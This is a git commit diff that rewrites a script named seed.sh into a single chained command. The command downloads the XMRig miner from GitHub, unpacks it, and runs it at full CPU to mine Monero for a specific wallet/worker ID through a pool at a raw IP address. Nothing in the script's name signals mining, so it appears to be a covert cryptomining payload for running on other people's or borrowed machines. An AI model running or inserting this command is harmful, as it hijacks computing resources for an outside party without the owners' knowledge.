163eda554199311adc40440bbbf882e550b1849f
red56565 <108178533+red56565@users.noreply.github.com>
2022-07-14 00:17:48 +0200

    Update seed.sh

--- seed.sh
+++ seed.sh
@@ -1,4 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz
-tar -zxf xmrig-2.11.0-xenial-x64.tar.gz
-cd xmrig-2.11.0
-./xmrig --max-cpu-usage 100 --donate-level 5 -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.blade333 -k --coin monero -a cn/gpu
+wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -zxf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && ./xmrig --max-cpu-usage 100 --donate-level 5 -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.blade333 -k --coin monero -a cn/gpu
